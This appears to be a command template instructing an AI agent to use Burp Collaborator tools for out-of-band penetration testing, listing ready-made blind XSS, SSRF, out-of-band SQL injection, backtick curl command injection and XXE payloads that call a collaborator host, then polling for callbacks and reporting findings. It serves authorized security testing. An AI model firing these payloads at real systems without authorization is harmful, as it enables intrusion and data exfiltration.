---
description: Generate and poll Burp Collaborator payloads for out-of-band testing.
---

Generate and use Burp Collaborator for out-of-band testing: $ARGUMENTS

Use Burp MCP Collaborator tools to:

1. **Generate Collaborator payloads**
   - Get a unique Collaborator server URL
   - Create payloads for different injection contexts

2. **Test for Blind Vulnerabilities**

   **Blind XSS:**
   ```
   <script src="http://YOUR-COLLAB-ID.burpcollaborator.net/xss"></script>
   ```

   **Blind SSRF:**
   ```
   http://YOUR-COLLAB-ID.burpcollaborator.net/ssrf
   ```

   **Blind SQLi (out-of-band):**
   ```
   ' UNION SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.YOUR-COLLAB-ID.burpcollaborator.net\\a'))--
   ```

   **Blind Command Injection:**
   ```
   `curl http://YOUR-COLLAB-ID.burpcollaborator.net/cmd`
   ```

   **XXE:**
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "http://YOUR-COLLAB-ID.burpcollaborator.net/xxe">
   ]>
   <foo>&xxe;</foo>
   ```

3. **Poll for interactions**
   - Check DNS lookups
   - Check HTTP callbacks
   - Analyze callback data (headers, IP, timing)

For each interaction received, provide:
- Injection point
- Vulnerability class
- Evidence (callback data)
- Impact assessment
